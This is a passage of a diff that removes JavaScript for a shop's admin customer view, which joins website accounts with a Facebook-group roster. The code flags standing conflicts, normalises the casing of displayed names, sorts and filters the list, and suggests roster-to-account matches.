-      if (!acct) return true;              // no live account after all, keep it standalone
-      Object.assign(acct, {
-        member_id: r.member_id, kind: 'both',
-        roster_name: r.roster_name, roster_email: r.roster_email,
-        membership_status: r.membership_status, fb_group_member: r.fb_group_member,
-        membership_label: r.membership_label, membership_date: r.membership_date,
-        last_order_label: r.last_order_label, last_order_date_manual: r.last_order_date_manual,
-        validated: r.validated, validation_reason: r.validation_reason,
-        validated_by_email: r.validated_by_email, validated_at: r.validated_at,
-        comments: r.comments, created_by_email: r.created_by_email,
-        roster_deleted_at: r.roster_deleted_at, roster_deleted_by_email: r.roster_deleted_by_email,
-      });
-      return false;
-    });
-  }
-  _customersState._cache = rows;
-  _customersState._cacheScope = scope;
-  return { rows, error: null };
-}
-
-// ── shared row helpers ────────────────────────────────────────────────
-
-// A person's standing is answered by two independent systems that have never
-// been visible side by side: the website (profiles.status + banned_emails)
-// decides whether they can order, the roster (membership_status /
-// fb_group_member) records where they stand in the Facebook group. Neither
-// writes to the other. This surfaces the cases where they disagree instead
-// of silently preferring one.
-function customerStandingConflict(c) {
-  const approved = c.account_status === 'approved' && !c.is_banned;
-  const rosterBanned = c.membership_status === 'Banned';
-  const leftGroup = c.fb_group_member === 'Removed' || c.fb_group_member === 'No';
-  if (approved && rosterBanned) return 'admin_customers_conflict_banned_roster';
-  if (approved && leftGroup && c.member_id) return 'admin_customers_conflict_left_group';
-  if ((c.is_banned || c.account_status === 'denied') && c.membership_status === 'Active') return 'admin_customers_conflict_banned_active';
-  return null;
-}
-
-function customerKindChip(kind) {
-  const map = { both: 'admin_customers_kind_both', account: 'admin_customers_kind_account', roster: 'admin_customers_kind_roster' };
-  const key = map[kind] || 'admin_customers_kind_account';
-  return '<span class="customer-kind-chip customer-kind-' + escapeHtml(kind || 'account') + '">' + escapeHtml(t(key)) + '</span>';
-}
-
-// "Member since" displays the owner's free-text label ("January 2019") in
-// preference to the internal date, but sorting on that text is alphabetical:
-// "January 2024" would come before "March 2023". Sort on a real date instead,
-// derived from the label when the internal date is blank, using the same
-// parser the CSV importer uses. Rows with no usable date sort LAST in both
-// directions rather than clumping at the top of an ascending sort.
-function _custSinceKey(c) {
-  const d = c.membership_date
-    || (typeof parseDateLabel === 'function' ? parseDateLabel(c.membership_label) : null)
-    || (c.account_created_at ? String(c.account_created_at).slice(0, 10) : null);
-  return d || '9999-12-31';
-}
-
-// Phase 7.16: names arrive in whatever case they were typed or imported in,
-// and a shouty ALL-CAPS entry ("JERRY STULTZ") reads as an error sitting next
-// to normal ones. Fix the case per WORD, and only for words that are entirely
-// uppercase, so deliberate mixed case is never touched: McCay, DelPrete,
-// VanAntwerp and de Ryk all survive unchanged. Words of two letters or fewer
-// are left alone as well, so "TL Hadley" does not become "Tl Hadley".
-// Display only. The stored value is untouched - it is what prints on invoices
-// and customs forms, so it is not something to rewrite as a side effect of
-// rendering a table.
-function _custProperName(s) {
-  if (!s) return s;
-  return String(s).replace(/[^\s]+/g, function (word) {
-    // "Shouting" is decided by case-folding, not by a character range, so
-    // Polish, Czech and Hungarian names get the same treatment as Western
-    // European ones: ŁUKASIK is as much all-caps as MULLER.
-    // A word is shouting when it carries capitals and no lowercase letter.
-    // ß is excluded from the probe because it IS a lowercase letter with no
-    // traditional capital, so WEIß is conventional all-caps German; testing
-    // word === word.toUpperCase() instead would fail, since that expands ß
-    // to SS and the word would look mixed-case and stay shouting.
-    var probe = word.replace(/ß/g, '');
-    if (!/\p{Lu}/u.test(probe)) return word;      // no capitals: already lower, or uncased
-    if (/\p{Ll}/u.test(probe)) return word;       // mixed case is deliberate: McCay, DelPrete
-    var bare = word.replace(/['’.\-]/g, '');
-    if (bare.length <= 2) return word;              // TL, JR, II
-    if (/^(III|IV|VI|VII|VIII|IX|XI|XII|MD|PHD|DDS|DVM|RN|USA|UK)$/.test(bare)) return word;
-    // Capitalise the first letter of each run, letting anything non-letter act
-    // as the separator. Accents are preserved throughout: RENÉ -> René,
-    // MÜLLER-SCHMIDT -> Müller-Schmidt, ŁUKASIK -> Łukasik.
-    var out = word.toLowerCase().replace(/(^|[^\p{L}])(\p{L})/gu,
-      function (m, sep, ch) { return sep + ch.toUpperCase(); });
-    // No Mc/Mac special case, deliberately. Forcing the internal capital gets
-    // MCCAY -> McCay right and MACIAS -> MacIas, MACHADO -> MacHado,
-    // MACIEJ -> MacIej badly wrong, and no length guard separates a Scots
-    // patronymic from a Spanish, Portuguese or Polish name that merely starts
-    // with the same letters. Mccay and Macdonald are unglamorous but they are
-    // real spellings; MacIas is a corruption. Since the twin of this rule
-    // REWRITES stored names that print on invoices and customs forms, the
-    // failure that produces a valid-looking name is the one to prefer.
-    return out;
-  });
-}
-
-
-// Phase 7.16: an admin looking at the customer list needs to know at a glance
-// which of these people can also get into the admin panel. isAdminEmail works
-// on any address; isOwner only answers for the logged-in user, so the Owner is
-// identified by the same constant the capability loader falls back to.
-function customerRoleChips(email) {
-  if (!email) return '';
-  var out = '';
-  if (String(email).toLowerCase() === OWNER_EMAIL_FALLBACK) {
-    out += '<span class="customer-owner-chip">' + escapeHtml(t('admin_customers_role_owner')) + '</span>';
-  }
-  if (typeof isAdminEmail === 'function' && isAdminEmail(email)) {
-    out += '<span class="customer-admin-chip">' + escapeHtml(t('admin_customers_role_admin')) + '</span>';
-  }
-  return out;
-}
-
-function _custFmtDate(d) {
-  if (!d) return '';
-  try { return new Date(d).toLocaleDateString(lang === 'de' ? 'de-DE' : 'en-US', { year: 'numeric', month: 'short', day: 'numeric' }); }
-  catch (e) { return ''; }
-}
-
-// ── list view ─────────────────────────────────────────────────────────
-
-async function renderCustomersList(el) {
-  const { rows: all, error } = await _customersFetch();
-  _customersState._useCache = false;  // consume; every other path refetches
-  if (error) {
-    el.innerHTML = '<div style="padding:16px;border:1px solid #b00;border-radius:6px;background:rgba(176,0,0,0.06);color:#b00;font-size:14px;line-height:1.5">'
-      + '<strong>' + escapeHtml(t('admin_customers_load_failed')) + '</strong><br>'
-      + escapeHtml(error.message || String(error)) + '</div>';
-    return;
-  }
-
-  const st = _customersState;
-  const term = (st.search || '').trim().toLowerCase();
-  const rows = (all || []).filter(c => {
-    if (st.filterKind && c.kind !== st.filterKind) return false;
-    if (st.filterAccountStatus && c.account_status !== st.filterAccountStatus) return false;
-    if (st.filterRosterStatus && c.membership_status !== st.filterRosterStatus) return false;
-    if (st.filterFb && c.fb_group_member !== st.filterFb) return false;
-    if (term) {
-      const hay = [c.display_name, c.roster_name, c.primary_email, c.roster_email, c.facebook_name,
-                   c.city, c.country, c.comments, c.validation_reason,
-                   c.membership_label, c.last_order_label].filter(Boolean).join(' ').toLowerCase();
-      if (!hay.includes(term)) return false;
-    }
-    return true;
-  });
-
-  const dir = st.sortDir === 'asc' ? 1 : -1;
-  const sf = st.sortField;
-  rows.sort((a, b) => {
-    let av, bv;
-    switch (sf) {
-      case 'primary_email':   av = (a.primary_email || '').toLowerCase(); bv = (b.primary_email || '').toLowerCase(); break;
-      case 'membership_date': av = _custSinceKey(a); bv = _custSinceKey(b); break;
-      case 'account_created_at': av = a.account_created_at || ''; bv = b.account_created_at || ''; break;
-      case 'order_count':     av = Number(a.order_count) || 0; bv = Number(b.order_count) || 0; break;
-      case 'account_status':  av = (a.account_status || '~'); bv = (b.account_status || '~'); break;
-      default:                av = (a.display_name || '').toLowerCase(); bv = (b.display_name || '').toLowerCase();
-    }
-    if (av < bv) return -1 * dir;
-    if (av > bv) return 1 * dir;
-    return 0;
-  });
-
-  const arrow = (f) => sf === f ? (dir === 1 ? ' ▲' : ' ▼') : '';
-  const canManage = hasCapability('can_manage_members');
-  const trashCount = st.showDeleted ? (all || []).filter(c => c.roster_deleted_at).length : 0;
-
-  const selStyle = 'padding:8px 9px;background:var(--surface2);color:var(--cream);border:1px solid var(--line2);border-radius:4px;font-size:12px';
-  const opt = (v, label, cur) => '<option value="' + escapeHtml(v) + '"' + (cur === v ? ' selected' : '') + '>' + escapeHtml(label) + '</option>';
-
-  const toolbar = `
-    <div class="member-search-bar">
-      <input type="text" id="customersSearch" oninput="customersOnSearch(this.value)" placeholder="${escapeHtml(t('admin_customers_search_ph'))}" value="${escapeHtml(st.search)}" style="flex:1;min-width:220px;max-width:360px;padding:9px;background:var(--surface2);color:var(--cream);border:1px solid var(--line2);border-radius:4px;font-size:13px;box-sizing:border-box">
-      <select onchange="customersSetFilter('filterKind', this.value)" style="${selStyle}">
-        ${opt('', t('admin_customers_filter_kind_all'), st.filterKind)}
-        ${opt('both', t('admin_customers_kind_both'), st.filterKind)}
-        ${opt('account', t('admin_customers_filter_account_only'), st.filterKind)}
-        ${opt('roster', t('admin_customers_filter_roster_only'), st.filterKind)}
-      </select>
-      <select onchange="customersSetFilter('filterAccountStatus', this.value)" style="${selStyle}">
-        ${opt('', t('admin_customers_filter_status_all'), st.filterAccountStatus)}
-        ${opt('pending', t('status_pending'), st.filterAccountStatus)}
-        ${opt('approved', t('status_approved'), st.filterAccountStatus)}
-        ${opt('denied', t('status_denied'), st.filterAccountStatus)}
-      </select>
-      <select onchange="customersSetFilter('filterRosterStatus', this.value)" style="${selStyle}">
-        ${opt('', t('admin_customers_filter_roster_all'), st.filterRosterStatus)}
-        ${CUSTOMER_ROSTER_STATUSES.map(s => opt(s, t('admin_members_status_' + s.toLowerCase()), st.filterRosterStatus)).join('')}
-      </select>
-      <select onchange="customersSetFilter('filterFb', this.value)" style="${selStyle}">
-        ${opt('', t('admin_customers_filter_fb_all'), st.filterFb)}
-        ${CUSTOMER_FB_STATES.map(s => opt(s, t('admin_members_fb_' + s.toLowerCase()), st.filterFb)).join('')}
-      </select>
-      <span style="font-size:11px;color:var(--cream-dim)">${rows.length}${(term || st.filterKind || st.filterAccountStatus || st.filterRosterStatus || st.filterFb) ? ' / ' + (all || []).length : ''}</span>
-    </div>
-    <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:12px">
-      ${canManage ? `<button class="btn btn-gold btn-sm" onclick="customersStartAddRoster()" data-t="admin_customers_add_roster"></button>` : ''}
-      ${canManage ? `<button class="btn btn-outline btn-sm" onclick="customersImportRoster()" data-t="admin_members_import"></button>` : ''}
-      ${canManage ? `<button class="btn btn-ghost btn-sm" onclick="adminMembersExport(false)" data-t="admin_customers_export_roster_active"></button>` : ''}
-      ${canManage ? `<button class="btn btn-ghost btn-sm" onclick="adminMembersExport(true)" data-t="admin_customers_export_roster_all"></button>` : ''}
-      <button class="btn btn-ghost btn-sm" onclick="customersToggleDeleted()">${escapeHtml(t(st.showDeleted ? 'admin_members_hide_deleted' : 'admin_members_show_deleted'))}</button>
-      ${canManage ? `<button class="btn btn-ghost btn-sm" style="margin-left:auto;color:#8b2a2a;border-color:rgba(139,42,42,0.5)" onclick="customersMassDeleteRoster()" data-t="admin_customers_mass_delete_roster"></button>` : ''}
-      ${(st.showDeleted && trashCount > 0 && isOwner()) ? `<button class="btn btn-ghost btn-sm" style="color:#8b2a2a;border-color:rgba(139,42,42,0.5)" onclick="customersEmptyRosterTrash()" data-t="admin_customers_empty_trash"></button>` : ''}
-    </div>
-    <div id="customersBulkBar" style="display:none;margin-bottom:12px;padding:10px 14px;background:rgba(139,42,42,0.08);border-left:3px solid #8b2a2a;border-radius:4px;align-items:center;gap:12px;justify-content:space-between;flex-wrap:wrap">
-      <span style="font-size:13px;color:var(--cream)"><strong id="customersBulkCount">0</strong> ${escapeHtml(t('bulk_selected'))}</span>
-      <button class="btn btn-danger btn-sm" onclick="openBulkDeleteModal('.cust-row-check')">${escapeHtml(t('btn_delete_selected'))}</button>
-    </div>`;
-
-  const head = `<div class="admin-table-wrap"><table class="admin-table customers-table"><thead><tr>
-      <th style="width:32px">${isOwner() ? '<input type="checkbox" id="customersSelectAll" onclick="customersToggleSelectAll(this)" aria-label="Select all">' : ''}</th>
-      <th style="cursor:pointer;user-select:none" onclick="customersSort('display_name')">${escapeHtml(t('admin_customers_col_customer'))}${arrow('display_name')}</th>
-      <th style="cursor:pointer;user-select:none" onclick="customersSort('primary_email')">${escapeHtml(t('col_email'))}${arrow('primary_email')}</th>
-      <th style="cursor:pointer;user-select:none" onclick="customersSort('account_status')">${escapeHtml(t('admin_customers_col_standing'))}${arrow('account_status')}</th>
-      <th class="cust-col-since" style="cursor:pointer;user-select:none" onclick="customersSort('membership_date')">${escapeHtml(t('admin_customers_col_member_since'))}${arrow('membership_date')}</th>
-      <th class="cust-col-since" style="cursor:pointer;user-select:none" onclick="customersSort('account_created_at')">${escapeHtml(t('admin_customers_col_joined_site'))}${arrow('account_created_at')}</th>
-      <th style="cursor:pointer;user-select:none" onclick="customersSort('order_count')">${escapeHtml(t('admin_customers_col_orders'))}${arrow('order_count')}</th>
-      <th class="cust-col-notes">${escapeHtml(t('admin_customers_col_notes'))}</th>
-      <th>${escapeHtml(t('col_actions'))}</th>
-    </tr></thead><tbody>`;
-
-  const body = rows.length === 0
-    ? `<tr><td colspan="9" style="text-align:center;color:var(--cream-dim);font-style:italic;padding:16px">${escapeHtml(t('admin_customers_no_matches'))}</td></tr>`
-    : rows.map(c => renderCustomerListRow(c)).join('');
-
-  el.innerHTML = toolbar + head + body + '</tbody></table></div>';
-  if (typeof applyT === 'function') applyT();
-  const bar = document.getElementById('customersBulkBar');
-  if (bar) bar.style.display = 'none';
-}
-
-function renderCustomerListRow(c) {
-  const isDeleted = !!c.roster_deleted_at;
-  const isAdmin = c.primary_email ? isAdminEmail(c.primary_email) : false;
-
-  // Row tint follows the ROSTER status, matching the old Members tab, but is
-  // suppressed on trashed rows so a deleted banned person does not shout.
-  let rowClass = 'customer-row';
-  if (!isDeleted) {
-    if (c.membership_status === 'Banned') rowClass += ' member-status-banned';
-    else if (c.membership_status === 'Inactive') rowClass += ' member-status-inactive';
-  }
-  const rowStyle = isDeleted ? 'opacity:0.5;font-style:italic' : '';
-
-  // Only real accounts can be bulk-deleted, and never an admin's own.
-  const checkboxCell = (c.profile_id && !isAdmin && !isDeleted && isOwner())
-    ? `<td><input type="checkbox" class="cust-row-check" data-user-id="${escapeHtml(c.profile_id)}" data-user-email="${escapeHtml(c.primary_email || '')}" data-user-name="${escapeHtml(c.display_name || '')}" onclick="customersUpdateBulkBar()" aria-label="Select row"></td>`
-    : '<td></td>';
-
-  const sub = [];
-  if (c.facebook_name) sub.push(`<span style="font-size:10px;color:var(--gold-ink);font-family:'DM Mono',monospace">fb: ${escapeHtml(_custProperName(c.facebook_name))}</span>`);
-  const place = [c.city, c.country].filter(Boolean).join(', ');
-  if (place) sub.push(`<span style="font-size:11px;color:var(--cream-dim)">${escapeHtml(place)}</span>`);
-  // A linked roster entry whose name disagrees with the account name is worth
-  // seeing: it is usually a nickname, occasionally the wrong person.
-  // Compare the DISPLAYED forms, not the raw ones: "JERRY STULTZ" on the
-  // account and "Jerry Stultz" on the roster are the same name, and showing
-  // both would be noise created purely by the casing fix.
-  const _rosterShown = _custProperName(c.roster_name);
-  if (c.kind === 'both' && _rosterShown && _rosterShown !== _custProperName(c.display_name)) {
-    sub.push(`<span style="font-size:10px;color:var(--cream-dim);font-style:italic">${escapeHtml(t('admin_customers_roster_name_prefix'))} ${escapeHtml(_rosterShown)}</span>`);
-  }
-
-  const deletedTag = isDeleted ? `<span style="color:#c66;font-size:10px;margin-right:6px">${escapeHtml(t('admin_members_deleted_label'))}</span>` : '';
-
-  // ── standing: website account on top, Facebook roster underneath ──
-  let standing = '';
-  if (c.account_status) {
-    standing += `<span class="status-badge status-${escapeHtml(c.account_status)}">${escapeHtml(t('status_' + c.account_status))}</span>`;
-    if (c.is_banned) standing += ` <span class="customer-banned-chip">${escapeHtml(t('status_banned'))}</span>`;
-    if (c.unlimited_access) standing += ` <span class="customer-unlimited-chip">${escapeHtml(t('access_unlimited'))}</span>`;
-  } else {
-    standing += `<span class="customer-noaccount-chip">${escapeHtml(t('admin_customers_no_account'))}</span>`;
-  }
-  if (c.member_id) {
-    const ms = c.membership_status || 'Active';
-    const fb = c.fb_group_member || 'No';
-    standing += `<div style="margin-top:4px"><span class="member-status-badge member-status-badge-${escapeHtml(ms.toLowerCase())}">${escapeHtml(t('admin_members_status_' + ms.toLowerCase()))}</span>`
-      + ` <span style="font-size:10px;color:var(--cream-dim)">${escapeHtml(t('admin_customers_fb_prefix'))} ${escapeHtml(t('admin_members_fb_' + fb.toLowerCase()))}</span></div>`;
-  } else {
-    standing += `<div style="margin-top:4px"><span style="font-size:10px;color:var(--cream-dim);font-style:italic">${escapeHtml(t('admin_customers_not_on_roster'))}</span></div>`;
-  }
-  const conflictKey = isDeleted ? null : customerStandingConflict(c);
-  if (conflictKey) {
-    standing += `<div class="customer-conflict" title="${escapeHtml(t(conflictKey))}">${escapeHtml(t('admin_customers_conflict'))}</div>`;
-  }
-
-  // ── the two dates stay separate: they are different events ──
-  const memberSince = c.membership_label
-    ? escapeHtml(c.membership_label)
-    : (c.membership_date ? escapeHtml(_custFmtDate(c.membership_date)) : `<span style="color:var(--cream-dim)">—</span>`);
-  const joinedSite = c.account_created_at
-    ? escapeHtml(_custFmtDate(c.account_created_at))
-    : `<span style="color:var(--cream-dim)">—</span>`;
-
-  // Orders: real data for people with an account, the hand-typed label for
-  // people without one (that is the only record that exists for them).
-  let ordersCell;
-  if (c.profile_id) {
-    const n = Number(c.order_count) || 0;
-    ordersCell = n === 0
-      ? `<span style="color:var(--cream-dim)">0</span>`
-      : `<strong style="color:var(--cream)">${n}</strong>${c.last_order_at ? `<br><span style="font-size:10px;color:var(--cream-dim)">${escapeHtml(_custFmtDate(c.last_order_at))}</span>` : ''}`;
-  } else {
-    ordersCell = c.last_order_label
-      ? `<span style="font-size:12px;color:var(--cream-dim)">${escapeHtml(c.last_order_label)}</span>`
-      : (c.last_order_date_manual
-          ? `<span style="font-size:12px;color:var(--cream-dim)">${escapeHtml(_custFmtDate(c.last_order_date_manual))}</span>`
-          : `<span style="color:var(--cream-dim)">—</span>`);
-  }
-
-  // ── notes and flags, condensed to markers; the full text is in the profile ──
-  const notes = [];
-  (c.flags ? String(c.flags).split(',') : []).filter(Boolean).forEach(f => {
-    const key = f === 'similar_email' ? 'flag_email' : 'flag_address';
-    notes.push(`<div class="flag-note">${escapeHtml(t(key))}</div>`);
-  });
-  if (c.email_mismatch) notes.push(`<div class="customer-warn-note" title="${escapeHtml(t('admin_customers_email_mismatch'))}">${escapeHtml(t('admin_customers_email_mismatch_short'))}</div>`);
-  if (c.validated) {
-    const who = c.validated_by_email ? t('admin_members_validated_by') + ' ' + c.validated_by_email + (c.validated_at ? ' ' + t('admin_members_on') + ' ' + _custFmtDate(c.validated_at) : '') : '';
-    notes.push(`<div class="customer-validated-note"${who ? ` title="${escapeHtml(who)}"` : ''}>${escapeHtml(t('admin_customers_validated_short'))}</div>`);
-  }
-  if (c.comments) notes.push(`<div class="customer-note-marker" title="${escapeHtml(c.comments)}">${escapeHtml(t('admin_customers_has_notes'))}</div>`);
-  const notesCell = notes.length ? notes.join('') : '<span style="color:var(--cream-dim)">—</span>';
-
-  // Every mutation lives in the profile view. One button, one width, always.
-  const actions = `<button class="btn btn-outline btn-sm" onclick="customersOpen('${escapeHtml(c.row_key)}')" data-t="admin_customers_open"></button>`;
-
-  return `<tr class="${rowClass}" style="${rowStyle}">
-    ${checkboxCell}
-    <td><strong style="color:var(--cream)">${deletedTag}${escapeHtml(_custProperName(c.display_name) || '')}</strong> ${customerKindChip(c.kind)}${customerRoleChips(c.primary_email)}${sub.length ? '<br>' + sub.join('<br>') : ''}</td>
-    <td>${c.primary_email ? escapeHtml(c.primary_email) : `<span style="color:var(--cream-dim)">—</span>`}</td>
-    <td>${standing}</td>
-    <td class="cust-col-since">${memberSince}</td>
-    <td class="cust-col-since">${joinedSite}</td>
-    <td>${ordersCell}</td>
-    <td class="cust-col-notes">${notesCell}</td>
-    <td style="white-space:nowrap">${actions}</td>
-  </tr>`;
-}
-
-// ── list interactions ─────────────────────────────────────────────────
-// Search, filters and sort are pure client-side passes over the rows we
-// already hold, so they reuse the cache rather than re-querying on every
-// keystroke. A real reload (tab open, showDeleted flip, any mutation)
-// leaves _useCache false and refetches.
-
-function customersOnSearch(value) {
-  _customersState.search = value;
-  _customersState._useCache = true;
-  renderAdminCustomers().then(() => {
-    const inp = document.getElementById('customersSearch');
-    if (inp) { inp.focus(); const n = inp.value.length; try { inp.setSelectionRange(n, n); } catch (e) {} }
-  });
-}
-
-function customersSetFilter(key, value) {
-  _customersState[key] = value;
-  _customersState._useCache = true;
-  renderAdminCustomers();
-}
-
-function customersSort(field) {
-  const st = _customersState;
-  if (st.sortField === field) st.sortDir = st.sortDir === 'asc' ? 'desc' : 'asc';
-  else { st.sortField = field; st.sortDir = (field === 'order_count' || field === 'account_created_at') ? 'desc' : 'asc'; }
-  st._useCache = true;
-  renderAdminCustomers();
-}
-
-function customersToggleDeleted() {
-  _customersState.showDeleted = !_customersState.showDeleted;
-  _customersState._useCache = false;   // different scope, must refetch
-  renderAdminCustomers();
-}
-
-function customersToggleSelectAll(headerCheckbox) {
-  document.querySelectorAll('.cust-row-check').forEach(cb => { cb.checked = headerCheckbox.checked; });
-  customersUpdateBulkBar();
-}
-
-function customersUpdateBulkBar() {
-  const checked = document.querySelectorAll('.cust-row-check:checked');
-  const bar = document.getElementById('customersBulkBar');
-  const count = document.getElementById('customersBulkCount');
-  if (!bar || !count) return;
-  if (checked.length > 0) { bar.style.display = 'flex'; count.textContent = checked.length; }
-  else bar.style.display = 'none';
-}
-
-// ── profile view ──────────────────────────────────────────────────────
-
-function customersOpen(rowKey) {
-  _customersState.openKey = rowKey;
-  _customersState._profile = null;
-  _customersState._member = null;
-  _customersState._orders = null;
-  _customersState._ordersError = null;
-  _customersState._linkResults = null;
-  renderAdminCustomers();
-  const panel = document.getElementById('adminCustomers');
-  if (panel && panel.scrollIntoView) panel.scrollIntoView({ block: 'start' });
-}
-
-function customersBack() {
-  _customersState.openKey = null;
-  _customersState._useCache = false;   // come back to fresh data
-  renderAdminCustomers();
-}
-
-async function renderCustomerProfile(el) {
-  const key = _customersState.openKey;
-  const { rows, error } = await _customersFetch();
-  _customersState._useCache = false;
-  if (error) {
-    el.innerHTML = '<div style="padding:16px;border:1px solid #b00;border-radius:6px;background:rgba(176,0,0,0.06);color:#b00;font-size:14px">'
-      + escapeHtml(t('admin_customers_load_failed') + (error.message || '')) + '</div>';
-    return;
-  }
-  if (_customersState.openKey !== key) return;   // superseded while fetching
-  const c = (rows || []).find(r => r.row_key === key);
-  if (!c) { customersBack(); return; }
-
-  // The list view carries a lean projection on purpose (the view holds no
-  // address, phone or paypal). The editable fields come from a FRESH read of
-  // the real rows every time, never a cached copy: this form writes back what
-  // it displays, so showing a stale row would silently revert whatever changed
-  // in between (an Approve on the Accounts tab, another admin's edit).
-  //
-  // The list stays clickable while a profile loads, so two renders can be in
-  // flight at once. Every await below is followed by a check that this render
-  // is still the one the admin asked for; a superseded render returns without
-  // touching the DOM or the state slots. Without that, render A can finish its
-  // profiles query after render B started and leave B showing B's header over
-  // A's address and account controls.
-  //
-  // A FAILED read is not an absent record. If either query errors, the row we
-  // already have from the view proves the half exists, so rendering the empty
-  // state would tell the admin this person has no website account (or is not
-  // on the roster) and offer to link them to one - about a live, approved,
-  // order-bearing account. Say so instead, and stop.
-  let p = null, m = null;
-  if (c.profile_id) {
-    const pr = await sb.from('profiles').select('*').eq('id', c.profile_id).single();
-    if (_customersState.openKey !== key) return;   // superseded
-    if (pr.error) { _custRenderProfileLoadError(el, c, pr.error); return; }
-    p = pr.data || null;
-  }
-  if (c.member_id) {
-    const mr = await sb.from('members').select('*').eq('id', c.member_id).single();
-    if (_customersState.openKey !== key) return;   // superseded
-    if (mr.error) { _custRenderProfileLoadError(el, c, mr.error); return; }
-    m = mr.data || null;
-  }
-  _customersState._profile = p;
-  _customersState._member = m;
-  const canManage = hasCapability('can_manage_members');
-
-  const chips = [];
-  chips.push(customerKindChip(c.kind));
-  const roleChips = customerRoleChips(c.primary_email);
-  if (roleChips) chips.push(roleChips);
-  if (c.account_status) chips.push(`<span class="status-badge status-${escapeHtml(c.account_status)}">${escapeHtml(t('status_' + c.account_status))}</span>`);
-  if (c.is_banned) chips.push(`<span class="customer-banned-chip">${escapeHtml(t('status_banned'))}</span>`);
-  if (c.unlimited_access) chips.push(`<span class="customer-unlimited-chip">${escapeHtml(t('access_unlimited'))}</span>`);
-  if (c.validated) chips.push(`<span class="customer-validated-chip">${escapeHtml(t('admin_customers_validated_short'))}</span>`);
-  if (c.roster_deleted_at) chips.push(`<span class="customer-banned-chip">${escapeHtml(t('admin_members_deleted_label'))}</span>`);
-
-  const conflictKey = customerStandingConflict(c);
-  const conflictBanner = conflictKey ? `
-    <div style="margin:0 0 16px;padding:10px 14px;background:rgba(168,100,42,0.10);border-left:3px solid #a8642a;border-radius:0 4px 4px 0;font-size:13px;color:var(--cream)">
-      <strong>${escapeHtml(t('admin_customers_conflict'))}.</strong> ${escapeHtml(t(conflictKey))}
-    </div>` : '';
-
-  el.innerHTML = `
-    <div style="margin-bottom:14px">
-      <button class="btn btn-ghost btn-sm" onclick="customersBack()" data-t="admin_customers_back"></button>
-    </div>
-    <div style="margin-bottom:18px;padding-bottom:14px;border-bottom:1px solid var(--line2)">
-      <h3 style="margin:0 0 6px;font-family:'Cinzel',serif;color:var(--cream);font-size:19px">${escapeHtml(_custProperName(c.display_name) || '')}</h3>
-      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">${chips.join(' ')}</div>
-      <div style="font-family:'DM Mono',monospace;font-size:12px;color:var(--cream-dim)">${escapeHtml(c.primary_email || '')}</div>
-    </div>
-    ${conflictBanner}
-    ${_custSectionIdentity(c, p, canManage)}
-    ${_custSectionAccount(c, p, canManage)}
-    ${_custSectionRoster(c, m, canManage)}
-    ${_custSectionNotes(c, m, canManage)}
-    <div class="customer-section">
-      <h4 class="customer-section-title" data-t="admin_customers_sec_orders"></h4>
-      <div id="customerOrders"><p style="color:var(--cream-dim);font-size:13px" data-t="admin_customers_orders_loading"></p></div>
-    </div>
-    ${_custSectionProvenance(c, canManage)}
-  `;
-  if (typeof applyT === 'function') applyT();
-  renderCustomerOrders(c.profile_id, key);
-}
-
-// A profile whose halves could not be read. Deliberately renders NOTHING
-// editable: the whole point is that we do not know the current values, so
-// offering a form that writes back what it displays would be worse than
-// showing an error.
-function _custRenderProfileLoadError(el, c, err) {
-  el.innerHTML = `
-    <div style="margin-bottom:14px">
-      <button class="btn btn-ghost btn-sm" onclick="customersBack()" data-t="admin_customers_back"></button>
-    </div>
-    <div style="padding:16px;border:1px solid #b00;border-radius:6px;background:rgba(176,0,0,0.06);color:#b00;font-size:14px;line-height:1.6">
-      <strong>${escapeHtml(t('admin_customers_profile_load_failed').replace('{name}', _custProperName(c.display_name) || ''))}</strong><br>
-      ${escapeHtml(err && (err.message || String(err)) || '')}
-      <div style="margin-top:12px">
-        <button class="btn btn-outline btn-sm" onclick="renderAdminCustomers()" data-t="admin_customers_retry"></button>
-      </div>
-    </div>`;
-  if (typeof applyT === 'function') applyT();
-}
-
-const _CUST_INPUT = 'width:100%;padding:9px;background:var(--surface2);color:var(--cream);border:1px solid var(--line2);border-radius:4px;font-size:14px;box-sizing:border-box';
-const _CUST_LABEL = 'display:block;font-size:11px;color:var(--cream-dim);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:4px';
-
-function _custField(id, labelKey, value, extra) {
-  return `<div>
-    <label style="${_CUST_LABEL}" data-t="${labelKey}"></label>
-    <input type="text" id="${id}" value="${escapeHtml(value == null ? '' : String(value))}" style="${_CUST_INPUT}"${extra || ''}>
-  </div>`;
-}
-
-
-// Phase 7.16: finding the other half of a person.
-// The roster came out of Facebook as names only, so there is no email to join
-// on and the pairing has to be judged by a human. These helpers do the looking
-// so the owner only has to do the deciding: candidates are scored by name and
-// offered with a one-click Link. Nothing here deletes or overwrites anything -
-// linking sets one column, members.profile_id, and Unlink clears it again.
-//
-// Everything reads the rows already in _customersState._cache, so typing costs
-// no queries and the panel works from the same data the list was drawn from.
-
-// Matching key: accents flattened, punctuation dropped, case folded. This is
-// ONLY ever compared, never shown. Display always goes through
-// _custProperName, which leaves René, Gläserne and Przemysław intact.
-function _custMatchKey(s) {
-  if (!s) return '';
-  return String(s)
-    .replace(/[ßẞ]/g, 'ss').replace(/[æÆ]/g, 'ae').replace(/[œŒ]/g, 'oe')
-    .replace(/[Łł]/g, 'l').replace(/[Øø]/g, 'o').replace(/[Ðð]/g, 'd').replace(/[Þþ]/g, 'th')
-    .normalize('NFD').replace(/[̀-ͯ]/g, '')
-    .toLowerCase().replace(/[^a-z0-9 ]/g, ' ').replace(/\s+/g, ' ').trim();
-}
-
-// How strongly do these two records look like the same person? Lower rank is
-// stronger. Mirrors the tiers the matching report used, so what the admin sees
-// here agrees with what that said.
-function _custMatchStrength(aName, aFb, bName, bFb) {
-  var an = _custMatchKey(aName), af = _custMatchKey(aFb);
-  var bn = _custMatchKey(bName), bf = _custMatchKey(bFb);
-  if (!an || !bn) return null;
-  if ((af && af === bn) || (bf && bf === an)) return { rank: 1, key: 'admin_customers_conf_fb' };
-  if (an === bn)                              return { rank: 2, key: 'admin_customers_conf_name' };
-  var at = an.split(' '), bt = bn.split(' ');
-  if (at.length > 1 && bt.length > 1
-      && at[0] === bt[0] && at[at.length - 1] === bt[bt.length - 1]) {
-    return { rank: 3, key: 'admin_customers_conf_firstlast' };
-  }
-  return null;
-}
-
-// Candidates for the missing half of c, best first.
-function customerSuggestions(c, rows) {
-  if (!c || c.kind === 'both') return [];
-  var wantKind = c.profile_id ? 'roster' : 'account';
-  var out = [];
-  (rows || []).forEach(function (o) {
